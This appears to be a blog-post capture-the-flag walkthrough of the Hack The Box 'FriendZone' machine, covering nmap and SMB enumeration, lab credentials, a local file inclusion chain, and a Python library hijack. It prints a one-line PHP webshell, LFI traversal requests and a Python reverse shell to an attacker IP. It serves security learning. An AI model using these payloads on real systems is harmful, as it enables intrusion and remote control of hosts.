+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Friend Zone Escape software
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-03T20:02:08
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2025-07-03T23:02:09+03:00
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds
+</code></pre><hr>
+<h2 id="tags-htb-friendzone-smb-lfi-privilege-escalation-python-hijack-reverse-shell-dns-enumeration">title: FriendZone HTB Walkthrough
+date: 2025-07-03
+categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security]
+tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration]</h2>
+<p>This post covers my process for solving the <strong>FriendZone</strong> box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.</p>
+<h2 id="references-1">References<a hidden class="anchor" aria-hidden="true" href="#references-1">#</a></h2>
+<ul>
+<li><a href="https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html">0xdf’s writeup</a></li>
+<li><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">Python library hijack privilege escalation</a></li>
+</ul>
+<h2 id="recon-1">Recon<a hidden class="anchor" aria-hidden="true" href="#recon-1">#</a></h2>
+<h3 id="nmap-scan-1">NMAP Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-scan-1">#</a></h3>
+<pre tabindex="0"><code>└──╼ [★]$ nmap -sC -sV 10.10.10.123
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT
+Nmap scan report for 10.10.10.123
+Host is up (0.011s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Friend Zone Escape software
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-03T20:02:08
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2025-07-03T23:02:09+03:00
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds
+</code></pre><p>Key findings:</p>
+<ul>
+<li>Open ports: 21 (FTP), 22 (SSH), 53 (DNS), 80/443 (HTTP/S), 139/445 (SMB/Samba)</li>
+<li>Notable: FTP, DNS, and multiple SMB shares</li>
+</ul>
+<h3 id="feroxbuster">Feroxbuster<a hidden class="anchor" aria-hidden="true" href="#feroxbuster">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>feroxbuster -u http://10.10.10.123
+</span></span></code></pre></div><ul>
+<li>Found /wordpress (301), /fz.jpg (200), etc.</li>
+<li>Possible Wordpress site, Apache, Ubuntu</li>
+</ul>
+<p>DNS Note:<br>
+Found CN friendzone.red — zone transfer possible.</p>
+<h2 id="attacks--enumeration">Attacks &amp; Enumeration<a hidden class="anchor" aria-hidden="true" href="#attacks--enumeration">#</a></h2>
+<h3 id="dns-port-53">DNS (Port 53)<a hidden class="anchor" aria-hidden="true" href="#dns-port-53">#</a></h3>
+<p>Tried AXFR on friendzone.red — nothing interesting.<br>
+Missed friendzoneportal.red initially (learned from 0xdf’s writeup).</p>
+<h3 id="smbsamba-enumeration-port-139445">SMB/Samba Enumeration (Port 139/445)<a hidden class="anchor" aria-hidden="true" href="#smbsamba-enumeration-port-139445">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -L //10.10.10.123/ -N
+</span></span></code></pre></div><p>Found general, Development, and other shares.<br>
+Accessed general share and found creds.txt:</p>
+<pre tabindex="0"><code>admin:WORKWORKHhallelujah@#
+</code></pre><p>Tried credentials on SSH, FTP, and SMB shares (only Development was accessible, but empty).</p>
+<h3 id="web-443--virtual-hosts">Web (443 / Virtual Hosts)<a hidden class="anchor" aria-hidden="true" href="#web-443--virtual-hosts">#</a></h3>
+<ul>
+<li>HTTPS site is mostly empty, but /js/js/ gives a base64-ish string.</li>
+<li>Looked for hidden endpoints, found /admin, /wordpress (empty), /js (interesting).</li>
+<li>Login at administrator1.friendzone.red using the creds works and leads to /dashboard.php.</li>
+</ul>
+<h3 id="lfi-via-pagename-param">LFI via <code>pagename</code> Param<a hidden class="anchor" aria-hidden="true" href="#lfi-via-pagename-param">#</a></h3>
+<p>dashboard.php revealed possible Local File Inclusion (LFI) via pagename param:</p>
+<pre tabindex="0"><code>dashboard.php?image_id=a.jpg&amp;pagename=timestamp
+</code></pre><ul>
+<li>Confirmed LFI by including ../uploads/upload.</li>
+</ul>
+<h3 id="getting-source-code">Getting Source Code<a hidden class="anchor" aria-hidden="true" href="#getting-source-code">#</a></h3>
+<p>Used PHP filters (and LFI) to read source code for dashboard.php, login.php, and upload.php.</p>
+<h3 id="uploading-webshell-via-smb">Uploading Webshell via SMB<a hidden class="anchor" aria-hidden="true" href="#uploading-webshell-via-smb">#</a></h3>
+<p>Uploaded a webshell to the Development share:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Triggered the webshell via LFI:</p>
+<pre tabindex="0"><code>dashboard.php?image_id=a.jpg&amp;pagename=../../../etc/Development/test&amp;cmd=id
+</code></pre><ul>
+<li>Note: cmd=id works as a parameter to the uploaded webshell.</li>
+</ul>
+<h3 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h3>
+<ul>
+<li>Found MySQL credentials:
+<pre tabindex="0"><code>db_user=friend
+db_pass=Agpyu12!0.213$
+db_name=FZ
+</code></pre></li>
+<li>Used creds to escalate to local user friend.</li>
+<li>Used pspy to find root running /opt/server_admin/reporter.py (which imports os).</li>
+<li>Python library hijack:<br>
+Modified /usr/lib/python2.7/os.py to include a reverse shell payload.<br>
+Waited for cron to trigger and got root shell.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.10.14.6&#34;</span>,<span style="color:#ae81ff">443</span>))
+</span></span><span style="display:flex;"><span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
+<ul>
+<li>Always enumerate all DNS and virtual hosts; CTFs hide clues everywhere.</li>
+<li>LFI and file upload vulnerabilities can be chained for RCE.</li>
+<li>Privilege escalation often involves writable scripts or modules; watch for Python hijacks.</li>
+<li>Tools like pspy are invaluable for watching root-level cronjobs and processes.</li>
+</ul>
+<hr>
+<p>Writeup based on my own exploitation process, with inspiration from community writeups.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/friendzone/">FriendZone</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/smb/">SMB</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/lfi/">LFI</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/privilege-escalation/">Privilege Escalation</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/python-hijack/">Python Hijack</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/reverse-shell/">Reverse Shell</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/dns/">DNS</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/enumeration/">Enumeration</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
